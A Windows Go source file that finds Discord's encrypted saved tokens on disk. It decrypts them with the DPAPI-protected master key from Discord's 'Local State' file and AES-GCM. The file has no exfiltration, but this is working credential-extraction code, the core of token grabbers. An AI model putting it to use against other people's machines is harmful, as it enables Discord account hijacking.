//go:build windows

package savedtokens

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"os"
	"regexp"
	"strings"
	"unsafe"

	"github.com/goccy/go-json"

	"golang.org/x/exp/slices"
	"golang.org/x/sys/windows"
)

var encryptedTokenRegex = regexp.MustCompile(`dQw4w9WgXcQ:[^\"]*`)

func win32CryptUnprotectData(data []byte) ([]byte, error) {
	out := windows.DataBlob{}
	var outPtr *uint16

	in := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}

	err := windows.CryptUnprotectData(&in, &outPtr, nil, 0, nil, 0, &out)
	if err != nil {
		return nil, err
	}

	defer windows.LocalFree(windows.Handle(unsafe.Pointer(out.Data)))
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(outPtr)))

	decrypted := make([]byte, out.Size)
	copy(decrypted, unsafe.Slice(out.Data, out.Size))

	return decrypted, nil
}

func getMasterKey() ([]byte, error) {
	keyFile := os.Getenv("APPDATA") + "/discord/Local State"

	keyFileContent, err := os.ReadFile(keyFile)
	if err != nil {
		return nil, err
	}

	var keyData struct {
		Crypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

	if err := json.Unmarshal(keyFileContent, &keyData); err != nil {
		return nil, err
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(keyData.Crypt.EncryptedKey)
	if err != nil {
		return nil, err
	}

	if len(encryptedKey) < 5 {
		return nil, err
	}

	encryptedKey = encryptedKey[5:]

	return win32CryptUnprotectData(encryptedKey)
}

func decryptToken(encrypted []byte) (string, error) {
	if len(encrypted) < 32 {
		return "", fmt.Errorf("invalid token length")
	}

	iv := encrypted[3:15]
	payload := encrypted[15:]

	key, err := getMasterKey()
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ivSize := len(iv)
	if len(payload) < ivSize {
		return "", fmt.Errorf("invalid payload length")
	}

	plaintext, err := aesGCM.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func searchEncryptedTokens(content []byte, savedTokens *SavedTokens) {
	for _, match := range encryptedTokenRegex.FindAll(content, -1) {
		encodedToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]

		encryptedToken, err := base64.StdEncoding.DecodeString(encodedToken)
		if err != nil {
			continue
		}

		token, err := decryptToken(encryptedToken)
		if err != nil {
			continue
		}

		// Add the token if it doesn't exist yet
		if slices.Contains(savedTokens.RawTokens, token) {
			continue
		}

		savedTokens.RawTokens = append(savedTokens.RawTokens, token)
	}
}
